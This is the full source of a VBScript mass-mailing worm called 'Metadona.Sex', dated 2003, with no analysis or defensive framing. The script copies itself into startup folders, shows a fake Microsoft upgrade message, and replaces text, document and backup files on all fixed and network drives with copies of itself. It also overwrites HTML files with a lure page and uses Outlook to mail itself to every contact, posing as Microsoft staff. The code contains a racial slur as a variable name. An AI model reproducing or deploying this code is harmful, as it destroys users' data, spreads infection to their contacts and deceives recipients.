   '___---___---___----=<<<Metadona.Sex>>>=----___---___---___'
   '___________________________________________________________

   Rem This is dedicated to my girlfriend.
   Rem I love you...;)
   Rem I will never forget you.
   Rem VBS --> Metadona.Sex v0.01
   Rem This was made in 2003.

   On Error Resume Next
   Dim Fso, Wsh, LSD, Akq, Gx, Gt, Fsys
   Dim F1, Nigga, ext, Xpq, Akv, Akw

   Akq = "c:\"
   Akq1 = "c:\Windows\Temp\NTHelp.vbs"
   Akq2 = "c:\Windows\Start Menu\Programs\StartUp\NTHelp.vbs"
   Akq3 = "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\BackUp.vbs"

   Set Fso = CreateObject("Scripting.FileSystemObject")
   Set Wsh = CreateObject("Wscript.Shell")
   LSD = Wscript.ScriptFullName

   Set Gx = Fso.GetFile(LSD)
       Gx.Copy(Akq1)
       Gx.Copy(Akq2)
       Gx.Copy(Akq3)
   WbPg
   Sailor
   Into
   Info(Spec)
   Fldr(Spec)
   MsgBox "System Upgraded Succesfully !!!",vbInformation,"MICROSOFT®"
       Fso.DeleteFile(LSD)
   Function WbPg()
   On Error Resume Next
       Set Xpq = Fso.Createtextfile("c:\Help.html")
           Xpq.WriteLine "<HTML>"
           Xpq.WriteLine "Hello..."
           Xpq.WriteLine "Click <A HREF=""file://c:\Windows\Temp\NThelp.vbs"" TARGET=""_top"""
           Xpq.WriteLine "TITLE=""file://c:\Windows\Temp\NThelp.vbs"">here</A> for assistance..."
           Xpq.WriteLine "</HTML>"
           Xpq.WriteLine "<!--by metadona.sex-->"
           Xpq.Close
   End Function

   Function Into()
     On Error Resume Next
     Dim d, dc, s, unk
     Set unk = CreateObject("Scripting.FileSystemObject")
     Set dc = unk.Drives
       For Each d In dc
           If d.DriveType = 2 Or d.DriveType = 3 Then
               Fldr (d.Path & "\")
           End If
       Next
     Into = s
   End Function

   Function Info(Spec)
   On Error Resume Next
   Dim Gt, Fsys, fso, Gt1
   Dim F1, Nigga, ext, Akv
   Akv = ".vbs"
   gt1 = "c:\Help.html"
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set Fsys = Fso.GetFolder(Spec)
   Set F1 = Fsys.Files
       For Each Nigga In F1
       ext = Fso.GetExtensionName(Nigga.Path)
       ext = Lcase(ext)
       s = LCase(Nigga.Name)
           If (ext = "txt") Or (ext = "doc") Or _
            (ext = "inf") Or (ext = "bak") Then
               Set Gt = Fso.GetFile(LSD)
               Gt.Copy Nigga.Path & Akv
               Fso.DeleteFile Nigga.Path
           End If
           If (ext = "htm") Or (ext = "html") Then
               Set Gt = Fso.GetFile(gt1)
               Gt.Copy Nigga.Path
           End If
       Next
   End Function

   Function Fldr(Spec)
     On Error Resume Next
     Dim f, f1, sf, unk
       Set unk = CreateObject("Scripting.FileSystemObject")
       Set f = unk.GetFolder(Spec)
       Set sf = f.SubFolders
     For Each f1 In sf
       Info (f1.Path)
       Fldr (f1.Path)
     Next
   End Function

   Function Sailor()
   Dim butt, mail1, mail2, mail3, mail0, users, bad, hornygirls, mail5, ass
   Ass = "c:\Windows\Temp\NTHelp.vbs"
   butt = Ass
   On Error Resume Next
   Set mail1 = CreateObject("Outlook.Application")
       If mail1 = "Outlook" Then
       Set mail2 = mail1.GetNameSpace("MAPI")
       Set mail3 = mail2.AddressLists
           For Each users In mail3
               If users.AddressEntries.Count <> 0 Then
               bad = users.AddressEntries.Count
                   For hornygirls = 1 To bad
                       Set mail5 = mail1.CreateItem(0)
                       Set mail0 = users.AddressEntries(hornygirls)
                           mail5.To = mail0.Address
                           mail5.Subject = mail0.Name & "." & " HAVING TROUBLE WITH YOUR WINDOWS® ?"
                           mail5.Body = "Accurate, System Scanner® let's you manage your system's resources without any problems." & vbcrlf & "Created For Windows® 9x/Nt/Xp." & vbCrLf & _
                            "Save time on the net and while browsing your files !!!" & vbcrlf & "Don't get mad..., don't get a bad hair day !!!" & vbcrlf & "Get the System Scanner® today !" & vbcrlf & vbcrlf & vbcrlf & vbcrlf &" Greets." & vbcrlf & "Microsoft® Staff"
                           mail5.DeleteAfterSubmit = True
                           mail5.Attachments.Add butt
                           If mail5.To <> "" Then
                               mail5.Send
                           End If
                   Next
               End If
           Next
       End If
   End Function
